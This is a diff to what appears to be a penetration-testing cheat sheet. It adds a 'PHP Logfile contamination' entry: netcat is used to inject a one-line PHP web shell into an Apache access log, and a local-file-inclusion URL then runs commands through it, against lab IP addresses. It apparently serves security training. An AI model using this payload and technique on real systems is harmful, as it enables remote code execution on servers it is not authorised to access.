@@ -72,6 +72,13 @@ Links:
 - Wordpress scan:
   `wpscan -u 10.10.10.10/wp/` 
 
+- PHP Logfile contamination:  (add the PHP code to the logfile and the with LFI get the logfile somewhere where "include PHP function" is being used)
+  `kali@kali:~$ nc -nv 10.11.0.22 80`  
+  `(UNKNOWN) [10.11.0.22] 80 (http) open` 
+  `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>` 
+  Use the PHP code in the logfile:  
+  `http://10.11.0.2/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`  
+
 - Aquatone Installation:
    `wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip` 
    `unzip aquatone_linux_amd64_*.zip -d /opt/aquatone/` 
